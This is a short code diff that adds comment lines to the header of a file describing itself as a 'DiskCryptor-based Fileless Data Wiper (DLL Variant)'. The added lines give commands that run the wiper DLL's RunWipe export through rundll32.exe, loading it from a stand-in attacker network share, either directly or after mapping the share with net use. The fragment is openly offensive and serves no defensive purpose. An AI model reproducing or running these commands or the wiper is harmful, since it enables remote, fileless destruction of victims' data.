@@ -1,3 +1,7 @@
+//rundll32.exe \\attacker\share\fileless_wiper.dll,RunWipe
+// if hosted on a share: 
+//net use Z: \\attacker\share , rundll32.exe Z:\fileless_wiper.dll,RunWipe
+
 /*
  * DiskCryptor-based Fileless Data Wiper (DLL Variant)
  * Integrated from multiple wipe modes with fileless execution improvements
